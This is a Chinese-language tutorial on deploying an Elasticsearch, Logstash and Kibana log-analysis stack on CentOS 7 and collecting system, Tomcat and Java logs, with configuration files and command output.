[{"content":"一、ELK 简介 ELK是一个流行的开源日志管理和分析平台，它由三个核心组件组成：Elasticsearch、Logstash和Kibana。这三个组件协同工作，使用户能够收集、存储、搜索、分析和可视化大量日志数据。ELK被广泛用于实时日志分析、应用性能监控、安全事件检测等领域。\n下面是每个组件的简要介绍：\nElasticsearch： Elasticsearch是一个开源分布式搜索和分析引擎。它用于存储和索引大量的数据，使用户能够快速进行全文搜索、分析和聚合。Elasticsearch的强大之处在于其分布式性能和可扩展性，它能够处理海量数据并提供高效的查询和分析。\nLogstash： Logstash是一个用于收集、处理和转发各种类型数据的数据流处理引擎。它可以从多种来源（如日志文件、消息队列、数据库等）收集数据，经过处理后将数据发送到目标存储（如Elasticsearch）。Logstash可以用于数据清洗、转换、标准化等，以便将数据准备好供后续的搜索和分析。\nKibana： Kibana是一个用于数据可视化和分析的开源工具。它提供了一个用户友好的Web界面，使用户能够创建仪表板、图表和地图来展示Elasticsearch中的数据。通过Kibana，用户可以通过交互式的界面深入分析数据、观察趋势、检测异常等。\nELK的工作流程通常是这样的：Logstash收集和处理各种数据源的日志数据，然后将处理后的数据发送到Elasticsearch进行索引和存储。用户可以使用Kibana来查询数据、创建可视化仪表板，从而更好地理解数据的情况。\n需要注意的是，Elasticsearch 在新版本中也被称为 Elastic Stack，因为除了上述三个核心组件外，Elastic 公司还提供了其他一些附加工具和功能，以进一步增强数据分析和管理的能力。\n二、Elasticsearch 集群部署 2.1 环境初始化 2.1.1 环境准备 主机名 IP 系统 配置 elasticsearch-01 10.0.0.11 CentOS 7.6 2U 4G elasticsearch-02 10.0.0.12 CentOS 7.6 1U 2G elasticsearch-03 10.0.0.13 CentOS 7.6 1U 2G 2.1.2 内核参数及服务调整 # 关闭防火墙 systemctl disable firewalld --now # 关闭 NetworkManager systemctl disable NetworkManager --now # 关闭selinux setenforce 0 sed -i \u0026#39;/SELINUX/s/enforcing/disabled/\u0026#39; /etc/selinux/config # 修改文件句柄数的限制 echo \u0026#34;* soft nofile 65536\u0026#34; \u0026gt;\u0026gt; /etc/security/limits.conf echo \u0026#34;* hard nofile 65536\u0026#34; \u0026gt;\u0026gt; /etc/security/limits.conf 2.1.3 配置 hosts 解析 # cat /etc/hosts 127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6 10.0.0.11 elasticsearch-01 10.0.0.12 elasticsearch-02 10.0.0.13 elasticsearch-03 2.1.4 安装必要的软件并同步时间 # 安装基础软件 yum install -y epel-release net-tools vim lrzsz tree screen lsof tcpdump wget ntpdate # 同步时间 cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime # 定时同步 echo \u0026#34;*/5 * * * * ntpdate time1.aliyun.com \u0026amp;\u0026gt; /dev/null \u0026amp;\u0026amp; hwclock -w\u0026#34; \u0026gt;\u0026gt; /var/spool/cron/root systemctl restart crond 2.1.5 配置 java 环境 支持一览表 | Elastic\nyum install java-1.8.0-openjdk -y java -version 2.2 安装 elasticsearch 2.2.1 yum 安装 elasticsearch 7.17 Download Elasticsearch | Elastic\n[Install Elasticsearch with RPM | Elasticsearch Guide 7.17] | Elastic\nrpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch cat \u0026gt; /etc/yum.repos.d/elasticsearch-7.repo \u0026lt;\u0026lt; EOF [elasticsearch] name=Elasticsearch repository for 7.x packages baseurl=https://artifacts.elastic.co/packages/7.x/yum gpgcheck=1 gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch enabled=0 autorefresh=1 type=rpm-md EOF yum install -y --enablerepo=elasticsearch elasticsearch 2.2.2 修改配置文件 # cat /etc/elasticsearch/elasticsearch.yml\ncluster.name: elk-cluster node.name: elk-node-01 # 每个节点唯一，根据需要修改 path.data: /apps/elasticsearch/data # 数据存放目录，需要手动创建 path.logs: /apps/elasticsearch/logs bootstrap.memory_lock: true network.host: 0.0.0.0 http.port: 9200 discovery.seed_hosts: [\u0026#34;10.0.0.11\u0026#34;, \u0026#34;10.0.0.12\u0026#34;, \u0026#34;10.0.0.13\u0026#34;] cluster.initial_master_nodes: [\u0026#34;10.0.0.11\u0026#34;, \u0026#34;10.0.0.12\u0026#34;, \u0026#34;10.0.0.13\u0026#34;] gateway.recover_after_nodes: 2 action.destructive_requires_name: true 参数解释\ncluster.name: elk-cluster: 设置Elasticsearch集群的名称为\u0026quot;elk-cluster\u0026quot;。 node.name: elk-node-01: 设置当前Elasticsearch节点的名称为\u0026quot;elk-node-01\u0026quot;。 path.data: /apps/elasticsearch/data 和 path.logs: /apps/elasticsearch/logs: 分别指定Elasticsearch数据和日志文件的存储路径。 bootstrap.memory_lock: true: 这个配置表示Elasticsearch将尝试锁定内存，以提高性能和稳定性。 network.host: 0.0.0.0: 允许Elasticsearch绑定到所有可用的网络接口，以允许来自任何IP地址的连接。 http.port: 9200: 设置Elasticsearch HTTP服务的监听端口为9200，这是默认的HTTP API端口。 discovery.seed_hosts: [\u0026quot;10.0.0.11\u0026quot;, \u0026quot;10.0.0.12\u0026quot;, \u0026quot;10.0.0.13\u0026quot;]: 指定了Elasticsearch集群的发现节点，这些节点用于启动和发现集群中的其他节点。 cluster.initial_master_nodes: [\u0026quot;10.0.0.11\u0026quot;, \u0026quot;10.0.0.12\u0026quot;, \u0026quot;10.0.0.13\u0026quot;]: 指定了初始的主节点列表，用于初始化集群。 gateway.recover_after_nodes: 2: 配置在至少有2个节点可用时才允许集群恢复。 action.destructive_requires_name: true: 这个配置要求在执行破坏性操作（如删除索引）时需要提供名称，以防止意外的操作。 2.2.3 修改内存限制 LimitMEMLOCK=infinity 是Systemd服务的配置参数之一，用于限制进程的内存锁定（mlock）资源。这个参数的含义是将内存锁定资源的限制设置为无限制，也就是允许进程锁定任意数量的内存。内存锁定是一种操作，用于将内存分配给进程，并防止操作系统将其交换到磁盘上，从而提高了对内存的快速访问。\n在某些应用程序中，特别是对于需要高性能和低延迟的应用程序，需要将一部分内存锁定，以确保数据始终位于物理内存中，而不会被交换到磁盘上，以减少访问延迟。将LimitMEMLOCK设置为infinity允许进程锁定所需的内存而不受限制。\n请注意，修改此设置可能会影响系统的性能和稳定性，因为不受限制的内存锁定可能导致系统资源不足，因此在进行此类配置更改时需要小心谨慎，并确保了解应用程序的内存使用模式和系统资源限制。\n此外，上述配置片段通常可以在Systemd服务单元文件（通常位于/etc/systemd/system/或/lib/systemd/system/中）中找到，并用于调整特定服务的资源限制。具体的配置文件可能因不同的Linux发行版和应用程序而有所不同。\n注意：要在Service 块中设置，不然不会生效\n# grep LimitMEMLOCK=infinity /usr/lib/systemd/system/elasticsearch.service -B 1 [Service] LimitMEMLOCK=infinity # systemctl daemon-reload 修改堆内存大小\n[Heap size settings | Elasticsearch Guide 8.9] | Elastic\n# grep Xm /etc/elasticsearch/jvm.options -Xms1g -Xmx1g 创建数据存放目录\nmkdir -p /apps/elasticsearch/{data,logs} chown -R elasticsearch.elasticsearch /apps/elasticsearch/ 2.3 启动服务并查看集群状态 Elasticsearch 集群状态用于表示集群的整体健康状况。Elasticsearch 集群可以处于不同的健康状态，这些状态反映了集群中数据分片的可用性和完整性。以下是 Elasticsearch 集群状态的主要介绍：\nGreen（绿色）: 集群处于最佳状态。 所有主分片和复制分片都可用。 集群的数据完整性和可用性都非常高。 所有节点都正常运行，没有故障。 性能正常，没有性能问题。 Yellow（黄色）: 集群状态表示为 \u0026ldquo;yellow\u0026rdquo; 时，主分片都可用，但复制分片（副本）可能存在问题。 可能有一些副本分片尚未分配到节点上，或者某些节点不可用。 数据完整性有一定程度的风险，因为复制分片的可用性受到影响。 性能通常良好，但需要关注集群健康状态。 Red（红色）: 集群状态表示为 \u0026ldquo;red\u0026rdquo; 时，意味着主分片不可用。 这可能是由于主分片丢失、未分配或者节点故障等问题引起的。 数据的可用性和完整性受到严重威胁，因为主分片无法提供数据访问。 性能可能会受到影响，具体取决于缺失的主分片数量和查询的性质。 2.3.1 启动服务 # systemctl start elasticsearch # systemctl status elasticsearch [root@elasticsearch-01 ~]# ss -ntl State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 *:22 *:* LISTEN 0 100 127.0.0.1:25 *:* LISTEN 0 128 :::9200 # 服务监听端口 :::* LISTEN 0 128 :::9300 # 集群通信端口 :::* LISTEN 0 128 :::22 :::* LISTEN 0 100 ::1:25 :::* [root@elasticsearch-01 ~]# curl localhost:9200 { \u0026#34;name\u0026#34; : \u0026#34;elk-node-01\u0026#34;,\t# 节点名称 \u0026#34;cluster_name\u0026#34; : \u0026#34;elk-cluster\u0026#34;, \u0026#34;cluster_uuid\u0026#34; : \u0026#34;XXO_Ik9XQo2Y5Uw6UvVS-g\u0026#34;, \u0026#34;version\u0026#34; : { \u0026#34;number\u0026#34; : \u0026#34;7.17.13\u0026#34;, # elasticsearch 版本号 \u0026#34;build_flavor\u0026#34; : \u0026#34;default\u0026#34;, \u0026#34;build_type\u0026#34; : \u0026#34;rpm\u0026#34;, \u0026#34;build_hash\u0026#34; : \u0026#34;2b211dbb8bfdecaf7f5b44d356bdfe54b1050c13\u0026#34;, \u0026#34;build_date\u0026#34; : \u0026#34;2023-08-31T17:33:19.958690787Z\u0026#34;, \u0026#34;build_snapshot\u0026#34; : false, \u0026#34;lucene_version\u0026#34; : \u0026#34;8.11.1\u0026#34;, \u0026#34;minimum_wire_compatibility_version\u0026#34; : \u0026#34;6.8.0\u0026#34;, \u0026#34;minimum_index_compatibility_version\u0026#34; : \u0026#34;6.0.0-beta1\u0026#34; }, \u0026#34;tagline\u0026#34; : \u0026#34;You Know, for Search\u0026#34;\t# 宣传语 } 2.3.2 查看集群状态 可以利用此接口对 elasticseach 集群状态进行监控\n[root@elasticsearch-01 ~]# curl localhost:9200/_cluster/health?pretty { \u0026#34;cluster_name\u0026#34; : \u0026#34;elk-cluster\u0026#34;, \u0026#34;status\u0026#34; : \u0026#34;green\u0026#34;,\t# 集群监控状态 \u0026#34;timed_out\u0026#34; : false, \u0026#34;number_of_nodes\u0026#34; : 3, \u0026#34;number_of_data_nodes\u0026#34; : 3, \u0026#34;active_primary_shards\u0026#34; : 3, \u0026#34;active_shards\u0026#34; : 6, \u0026#34;relocating_shards\u0026#34; : 0, \u0026#34;initializing_shards\u0026#34; : 0, \u0026#34;unassigned_shards\u0026#34; : 0, \u0026#34;delayed_unassigned_shards\u0026#34; : 0, \u0026#34;number_of_pending_tasks\u0026#34; : 0, \u0026#34;number_of_in_flight_fetch\u0026#34; : 0, \u0026#34;task_max_waiting_in_queue_millis\u0026#34; : 0, \u0026#34;active_shards_percent_as_number\u0026#34; : 100.0 } 以下是其中的一些关键字段的解释：\n\u0026quot;cluster_name\u0026quot; : \u0026quot;elk-cluster\u0026quot;: 集群的名称，这个示例中的集群名称为 \u0026ldquo;elk-cluster\u0026rdquo;。\n\u0026quot;status\u0026quot; : \u0026quot;green\u0026quot;: 集群的健康状态，这个示例中集群状态为 \u0026ldquo;green\u0026rdquo;，表示集群处于最佳状态。\n\u0026quot;number_of_nodes\u0026quot; : 3: 集群中的节点数量，这个示例中有3个节点。\n\u0026quot;number_of_data_nodes\u0026quot; : 3: 集群中的数据节点数量，这是实际存储数据的节点数，这个示例中也是3个。\n\u0026quot;active_primary_shards\u0026quot; : 3: 活动主分片的数量，这是集群中主要负责存储数据的分片数量，这个示例中有3个。\n\u0026quot;active_shards\u0026quot; : 6: 所有活动分片的数量，包括主分片和副本分片，这个示例中有6个。\n\u0026quot;relocating_shards\u0026quot; : 0: 正在迁移的分片数量，如果你在重新平衡集群或迁移分片，则该值可能会增加。\n\u0026quot;initializing_shards\u0026quot; : 0: 正在初始化的分片数量，通常在新分片或节点加入时出现。\n\u0026quot;unassigned_shards\u0026quot; : 0: 未分配的分片数量，这是指尚未分配到任何节点的分片数量。在集群状态为 \u0026ldquo;green\u0026rdquo; 时，这应该是0。\n\u0026quot;delayed_unassigned_shards\u0026quot; : 0: 延迟未分配的分片数量，这是指尚未分配到节点，但由于一些原因而被延迟的分片数量。\n\u0026quot;number_of_pending_tasks\u0026quot; : 0: 集群中待处理任务的数量，例如索引创建或删除等操作可能会生成待处理任务。\n\u0026quot;number_of_in_flight_fetch\u0026quot; : 0: 目前正在进行的数据获取请求的数量。\n\u0026quot;task_max_waiting_in_queue_millis\u0026quot; : 0: 队列中等待的任务的最大等待时间（以毫秒为单位）。\n\u0026quot;active_shards_percent_as_number\u0026quot; : 100.0: 活动分片的百分比，作为数字表示。在 \u0026ldquo;green\u0026rdquo; 状态下，应该是100%，表示所有分片都是活动的。\n总的来说，这些信息提供了有关 Elasticsearch 集群状态和性能的关键指标，可以用于监控和管理集群。在 \u0026ldquo;green\u0026rdquo; 状态下，集群是健康的，数据完整性和可用性都非常高。\n2.3.3 elasticseach 插件 官方提供了一些插件但大部分是收费的，另外也有一些开发爱好者提供的插件，可以实现对 elasticsearch 集群的状态监控与管理配置等功能，Multi Elasticsearch Head 就是其中一个。\n可以通过浏览器的应用商店安装 （chrome 、edge）\nhttps://chrome.google.com/webstore/detail/multi-elasticsearch-head/cpmmilfkofbeimbmgiclohpodggeheim?utm_source=ext_app_menu\n三、 Logstash 部署 Logstash 是一个开源的数据收集引擎，可以水平伸缩，基于 ruby 开发，而且 logstash 整个 ELK当中拥有最多插件的一个组件，其可以接收来自不同来源的数据并统一输出到指定的且可以是多个不同目的地。\n3.1 环境准备 主机名 IP 系统 配置 logstash 10.0.0.15 CentOS 7.6 2U 4G 3.1.2 关闭不需要的服务 # 关闭防火墙 systemctl disable firewalld --now # 关闭 NetworkManager systemctl disable NetworkManager --now # 关闭selinux setenforce 0 sed -i \u0026#39;/SELINUX/s/enforcing/disabled/\u0026#39; /etc/selinux/config 3.1.2 配置 Java 环境 yum install java-1.8.0-openjdk -y java -version 3.2 安装 logstash [Installing Logstash | Logstash Reference 7.17] | Elastic\n# 导入证书 rpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch # 配置 yum 源 cat \u0026gt; /etc/yum.repos.d/logstash-7.repo \u0026lt;\u0026lt; EOF [logstash-7.x] name=Elastic repository for 7.x packages baseurl=https://artifacts.elastic.co/packages/7.x/yum gpgcheck=1 gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch enabled=1 autorefresh=1 type=rpm-md EOF # 安装并启动服务 yum install -y logstash systemctl start logstash.service 3.3 logstash 的使用 Logstash 是一个开源的数据收集引擎，可以水平伸缩，而且 logstash 整个 ELK 当中拥有最多插件的一个组件，其可以接收来自不同来源的数据并统一输出到指定的且可以是多个不同目的地。\n3.3.1 测试标准输入和标准输出 在Logstash的配置中，\u0026ldquo;codec\u0026rdquo; 是\u0026quot;编解码器\u0026quot;（Codec）的缩写。编解码器是一种用于将数据编码成特定格式或从特定格式解码数据的组件。在Logstash中，它用于指定输入和输出的数据格式。\n在你提供的配置中，你使用了Elasticsearch输出插件，并指定了\u0026quot;codec\u0026quot;选项为\u0026quot;json\u0026quot;。这表示你希望将Logstash事件数据编码为JSON格式，然后将其发送到Elasticsearch。这有助于确保数据以JSON格式存储在Elasticsearch中，以便后续查询和分析。\n\u0026ldquo;codec\u0026quot;选项的常见值包括：\n\u0026ldquo;json\u0026rdquo;：将事件数据编码为JSON格式。\n\u0026ldquo;plain\u0026rdquo;：不对事件数据进行编码，保持原始格式。\n\u0026ldquo;json_lines\u0026rdquo;：将事件数据编码为一行一条JSON记录的格式。\n\u0026ldquo;multiline\u0026rdquo;：用于处理多行日志事件。\n[root@logstash ~]# /usr/share/logstash/bin/logstash -e \u0026#39;input{ stdin{} } output{ stdout{ codec=\u0026gt;rubydebug }}\u0026#39; ... The stdin plugin is now waiting for input: hello { \u0026#34;message\u0026#34; =\u0026gt; \u0026#34;hello\u0026#34;,\t# 消息内容 \u0026#34;host\u0026#34; =\u0026gt; \u0026#34;logstash\u0026#34;,\t# 主机名 \u0026#34;@timestamp\u0026#34; =\u0026gt; 2023-09-19T01:16:14.334Z, # 事件发生时间 \u0026#34;@version\u0026#34; =\u0026gt; \u0026#34;1\u0026#34;\t# 事件版本号，一个事件就是一个 ruby 对象 } ^C 3.3.2 测试输出到文件 [root@logstash ~]# /usr/share/logstash/bin/logstash -e \u0026#39;input { stdin{} } output{ file { path =\u0026gt; \u0026#34;/tmp/log-%{+YYYY.MM.dd}.txt\u0026#34;}}\u0026#39; ... The stdin plugin is now waiting for input: [INFO ] 2023-09-19 09:30:28.836 [Agent thread] agent - Pipelines running {:count=\u0026gt;1, :running_pipelines=\u0026gt;[:main], :non_running_pipelines=\u0026gt;[]} hello world ^C # 输出文本文件 [root@logstash ~]# file /tmp/log-2023.09.19.txt /tmp/log-2023.09.19.txt: ASCII text # 消息内容已输出到文本中，多条消息会追加到文件末尾 [root@logstash ~]# cat /tmp/log-2023.09.19.txt {\u0026#34;message\u0026#34;:\u0026#34;hello\u0026#34;,\u0026#34;@version\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;@timestamp\u0026#34;:\u0026#34;2023-09-19T01:30:40.576Z\u0026#34;,\u0026#34;host\u0026#34;:\u0026#34;logstash\u0026#34;} {\u0026#34;message\u0026#34;:\u0026#34;world\u0026#34;,\u0026#34;host\u0026#34;:\u0026#34;logstash\u0026#34;,\u0026#34;@version\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;@timestamp\u0026#34;:\u0026#34;2023-09-19T01:33:12.308Z\u0026#34;} 3.3.3 测试输出到 elasticsearch [root@logstash ~]# /usr/share/logstash/bin/logstash -e \u0026#39;input { stdin{} } output{ elasticsearch {hosts =\u0026gt; [\u0026#34;10.0.0.11:9200\u0026#34;] index =\u0026gt;\u0026#34;mytest-%{+YYYY.MM.dd}\u0026#34; }}\u0026#39; ... WARNING: All illegal access operations will be denied in a future release [INFO ] 2023-09-19 10:07:09.728 [[main]-pipeline-manager] javapipeline - Pipeline started {\u0026#34;pipeline.id\u0026#34;=\u0026gt;\u0026#34;main\u0026#34;} [INFO ] 2023-09-19 10:07:09.770 [Agent thread] agent - Pipelines running {:count=\u0026gt;1, :running_pipelines=\u0026gt;[:main], :non_running_pipelines=\u0026gt;[]} The stdin plugin is now waiting for input: hello world! 在 elasticsearch-01 查看索引\n[root@elasticsearch-01 ~]# curl -s -XGET \u0026#34;http://localhost:9200/_cat/indices?v\u0026#34; | grep mytest green open mytest-2023.09.19 qti_NT1sRNyBWrJY-T27zg 1 1 1 0 10.8kb 5.4kb 使用 head 插件 查看\n四、Kibana 部署 Kibana 是一款开源的数据分析和可视化平台，它是 Elastic Stack 成员之一，基于 TypeScript 语言开发，设计用于和 Elasticsearch 协作,可以使用 Kibana 对 Elasticsearch 索引中的数据进行搜索、查看、交互操作, 你可以很方便的利用图表、表格及地图对数据进行多元化的分析和呈现。\nKibana 可以使大数据通俗易懂。它很简单，基于浏览器的界面便于你快速创建和分享动态数据仪表板来追踪 Elasticsearch 的实时数据变化。\n4.1 环境准备 主机名 IP 系统 配置 kibana 10.0.0.16 CentOS 7.6 1U 2G # 关闭防火墙 systemctl disable firewalld --now # 关闭 NetworkManager systemctl disable NetworkManager --now # 关闭selinux setenforce 0 sed -i \u0026#39;/SELINUX/s/enforcing/disabled/\u0026#39; /etc/selinux/config 4.2 安装kibana [Install Kibana | Kibana Guide 7.17] | Elastic\n[Install Kibana with RPM | Kibana Guide 7.17] | Elastic\nrpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch cat \u0026gt; /etc/yum.repos.d/kibana-7.repo \u0026lt;\u0026lt; EOF [kibana-7.x] name=Kibana repository for 7.x packages baseurl=https://artifacts.elastic.co/packages/7.x/yum gpgcheck=1 gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch enabled=1 autorefresh=1 type=rpm-md EOF yum install -y kibana 4.3 启动服务并验证 # 修改配置文件 [root@kibana ~]# cat /etc/kibana/kibana.yml server.port: 5601 server.host: \u0026#34;0.0.0.0\u0026#34; elasticsearch.hosts: [\u0026#34;http://10.0.0.11:9200\u0026#34;] # 启动服务 [root@kibana ~]# systemctl start kibana # 验证端口及服务状态 [root@kibana ~]# ss -ntl|grep 5601 LISTEN 0 128 *:5601 *:* [root@kibana ~]# curl localhost:5601/status -I HTTP/1.1 200 OK x-content-type-options: nosniff referrer-policy: no-referrer-when-downgrade content-security-policy: script-src \u0026#39;unsafe-eval\u0026#39; \u0026#39;self\u0026#39;; worker-src blob: \u0026#39;self\u0026#39;; style-src \u0026#39;unsafe-inline\u0026#39; \u0026#39;self\u0026#39; kbn-name: kibana kbn-license-sig: 476866a5c1f8dfa58158ed8c49315635554443bf0f3ae73994b5dfac2c777125 content-type: text/html; charset=utf-8 cache-control: private, no-cache, no-store, must-revalidate content-length: 144960 vary: accept-encoding Date: Tue, 19 Sep 2023 03:14:15 GMT Connection: keep-alive Keep-Alive: timeout=120 服务启动成功后即可通过浏览器登录 kibana 管理索引并查看日志了\n访问方式：http://10.0.0.16:5601/\n可以在 Stack Management \u0026ndash;\u0026gt; Index Management 查看到已添加的索引，也可以在 Index pattern 添加索引模式，方便后续在 Discover 界面查看。\n五、Logstash 收集日志 5.1 收集单个日志 注意：logstash 默认以 logstash 用户启动，因为需要保证 logstash 用户对日志文件有对应的权限\n5.1.1 准备配置文件： [root@logstash ~]# cat /etc/logstash/conf.d/system-log.conf input { file { path =\u0026gt; \u0026#34;/var/log/messages\u0026#34; # 日志路径 type =\u0026gt; \u0026#34;system-log\u0026#34; # 事件的唯一类型 start_position =\u0026gt; \u0026#34;beginning\u0026#34; # 第一次收集日志的位置 stat_interval =\u0026gt; \u0026#34;3\u0026#34; # 日志收集的间隔时间 } } output { file { path =\u0026gt; \u0026#34;/tmp/%{type}-%{+YYYY.MM.dd}.log\u0026#34; } } 5.1.2 修改日志文件权限 [root@logstash ~]# chmod 644 /var/log/messages 5.1.3 修改校验文件语法 [root@logstash ~]# /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/system-log.conf -t ... . Config Validation Result: OK. Exiting Logstash # 语法校验通过 5.1.4 重启 logstash 验证结果 # 写入一行日志 [root@logstash ~]# echo \u0026#34;test\u0026#34; \u0026gt;\u0026gt; /var/log/messages # 成功获取收集到日志信息 [root@logstash ~]# grep test /tmp/system-log-2023.09.19.log {\u0026#34;@version\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;host\u0026#34;:\u0026#34;logstash\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;system-log\u0026#34;,\u0026#34;@timestamp\u0026#34;:\u0026#34;2023-09-19T07:02:14.221Z\u0026#34;,\u0026#34;path\u0026#34;:\u0026#34;/var/log/messages\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;test\u0026#34;} 5.2 收集多个日志 5.2.1 准备配置文件 [root@logstash ~]# cat /etc/logstash/conf.d/system-log.conf input { file { path =\u0026gt; \u0026#34;/var/log/messages\u0026#34; type =\u0026gt; \u0026#34;system-log\u0026#34; start_position =\u0026gt; \u0026#34;beginning\u0026#34; stat_interval =\u0026gt; \u0026#34;3\u0026#34; } file { path =\u0026gt; \u0026#34;/var/log/secure\u0026#34; type =\u0026gt; \u0026#34;secure-log\u0026#34; start_position =\u0026gt; \u0026#34;beginning\u0026#34; stat_interval =\u0026gt; \u0026#34;3\u0026#34; } } output { if [type] == \u0026#34;system-log\u0026#34; { elasticsearch { hosts=\u0026gt;[\u0026#34;10.0.0.11:9200\u0026#34;] index=\u0026gt;\u0026#34;%{type}-%{+YYYY.MM.dd}\u0026#34; } } if [type] == \u0026#34;secure-log\u0026#34; { elasticsearch { hosts=\u0026gt;[\u0026#34;10.0.0.11:9200\u0026#34;] index=\u0026gt;\u0026#34;%{type}-%{+YYYY.MM.dd}\u0026#34; } } } 5.2.2 修改日志文件权限 [root@logstash ~]# chmod 644 /var/log/{messages,secure} 5.2.3 校验语法并重启服务 [root@logstash ~]# /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/system-log.conf -t ... . Config Validation Result: OK. Exiting Logstash 5.2.4 在 elasticsearch 查看索引 [root@elasticsearch-01 ~]# curl -s -XGET \u0026#34;http://localhost:9200/_cat/indices?v\u0026#34; | grep log green open secure-log-2023.09.19 fQpud23vSVC7cpFPCITzbw 1 1 2 0 18.3kb 9.1kb green open system-log-2023.09.19 SeqTjpl-SU-n7uXUmmBBKA 1 1 40 0 44.8kb 22.4kb 5.3 在 kibana 查看索引 5.3.1 查看已有索引 5.3.2 添加索引模式 5.3.3 查看结果 5.4 收集 Tomcat 日志 5.4.1 在 logstash 安装tomcat yum install -y tomcat 5.4.2 配置 tomcat 日志格式为 json 格式 # 修改 pattern 为 json 格式 [root@kibana ~]# grep -A 2 localhost_access_log /etc/tomcat/server.xml prefix=\u0026#34;localhost_access_log.\u0026#34; suffix=\u0026#34;.txt\u0026#34; pattern=\u0026#34;{\u0026amp;quot;clientip\u0026amp;quot;:\u0026amp;quot;%h\u0026amp;quot;,\u0026amp;quot;ClientUser\u0026amp;quot;:\u0026amp;quot;%l\u0026amp;quot;,\u0026amp;quot;authenticated\u0026amp;quot;:\u0026amp;quot;%u\u0026amp;quot;,\u0026amp;quot;AccessTime\u0026amp;quot;:\u0026amp;quot;%t\u0026amp;quot;,\u0026amp;quot;method\u0026amp;quot;:\u0026amp;quot;%r\u0026amp;quot;,\u0026amp;quot;status\u0026amp;quot;:\u0026amp;quot;%s\u0026amp;quot;,\u0026amp;quot;SendBytes\u0026amp;quot;:\u0026amp;quot;%b\u0026amp;quot;,\u0026amp;quot;Query?string\u0026amp;quot;:\u0026amp;quot;%q\u0026amp;quot;,\u0026amp;quot;partner\u0026amp;quot;:\u0026amp;quot;%{Referer}i\u0026amp;quot;,\u0026amp;quot;AgentVersion\u0026amp;quot;:\u0026amp;quot;%{User-Agent}i\u0026amp;quot;}\u0026#34;/\u0026gt; 重启服务并验证 tomcat 日志格式\n[root@kibana ~]# systemctl start tomcat # 生成日志 [root@kibana ~]# curl localhost:8080 # 成功将日志修改为 json 格式 [root@kibana ~]# tail /var/log/tomcat/localhost_access_log.2023-09-19.txt {\u0026#34;clientip\u0026#34;:\u0026#34;0:0:0:0:0:0:0:1\u0026#34;,\u0026#34;ClientUser\u0026#34;:\u0026#34;-\u0026#34;,\u0026#34;authenticated\u0026#34;:\u0026#34;-\u0026#34;,\u0026#34;AccessTime\u0026#34;:\u0026#34;[19/Sep/2023:18:17:31 +0800]\u0026#34;,\u0026#34;method\u0026#34;:\u0026#34;GET / HTTP/1.1\u0026#34;,\u0026#34;status\u0026#34;:\u0026#34;404\u0026#34;,\u0026#34;SendBytes\u0026#34;:\u0026#34;-\u0026#34;,\u0026#34;Query?string\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;partner\u0026#34;:\u0026#34;-\u0026#34;,\u0026#34;AgentVersion\u0026#34;:\u0026#34;curl/7.29.0\u0026#34;} 可以通过 JSON在线 | JSON解析格式化—SO JSON在线工具 校验日志格式\n5.4.3 准备配置文件 input { file { path =\u0026gt; \u0026#34;/var/log/tomcat/localhost_access_log.*.txt\u0026#34; type =\u0026gt; \u0026#34;tomcat-access-log\u0026#34; start_position =\u0026gt; \u0026#34;end\u0026#34; stat_interval =\u0026gt; \u0026#34;3\u0026#34; codec=\u0026gt; \u0026#34;json\u0026#34; } } output { if [type] == \u0026#34;tomcat-access-log\u0026#34; { elasticsearch { hosts=\u0026gt;[\u0026#34;10.0.0.11:9200\u0026#34;] index=\u0026gt;\u0026#34;%{type}-%{+YYYY.MM.dd}\u0026#34; } } } 5.4.4 重启服务并生成日志 [root@logstash ~]# chmod +x /var/log/tomcat/ [root@logstash ~]# systemctl restart logstash [root@logstash ~]# curl localhost:8080 5.4.5 查看日志收集结果 5.5 收集 Java 日志 本节内容主要介绍 multiline 插件实现多行匹配，这是一个可以将多行进行合并的插件。有些情况下，Java 应用的日志会很长，在日志文件中以多行的方式呈现，因此需要用此插件来进行多行合并以保证日志的完整性和可读性，所以本节内容的操作是可选的而非必须的。\n[Multiline codec plugin | Logstash Reference 8.10] | Elastic\n5.5.1 在 elasticsearch-01 安装 logstash 这里是直接取用 elasticsearch-01的 java 日志进行演示，因此安装了 logstash\n# 导入证书 rpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch # 配置 yum 源 cat \u0026gt; /etc/yum.repos.d/logstash-7.repo \u0026lt;\u0026lt; EOF [logstash-7.x] name=Elastic repository for 7.x packages baseurl=https://artifacts.elastic.co/packages/7.x/yum gpgcheck=1 gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch enabled=1 autorefresh=1 type=rpm-md EOF # 安装并启动服务 yum install -y logstash 5.5.2 测试多行合并效果 5.5.2.1 准备配置文件 [root@elasticsearch-01 ~]# cat /etc/logstash/conf.d/test.conf input { stdin { codec =\u0026gt; multiline { pattern =\u0026gt; \u0026#34;^\\[\u0026#34; # 当遇到[开头的行时候将多行进行合并 negate =\u0026gt; true # true 为匹配成功进行操作，false 为不成功进行操作 what =\u0026gt; \u0026#34;previous\u0026#34; # 与以前的行合并，如果是下面的行合并就是 next } } } filter { #日志过滤，如果所有的日志都过滤就写这里，如果只针对某一个过滤就写在 input 里面的日志输入里面 } output { stdout { codec =\u0026gt; rubydebug } } 5.5.5.2 检查配置 /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/test.conf -t ... which may change in a future major release of Logstash. To avoid unexpected changes when upgrading Logstash, please explicitly declare your desired ECS Compatibility mode. Configuration OK 5.5.5.3 使用标准输出进行验证 [root@elasticsearch-01 ~]# /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/test.conf Using bundled JDK: /usr/share/logstash/jdk ... [INFO ] 2023-09-21 11:59:55.717 [[main]-pipeline-manager] javapipeline - Pipeline started 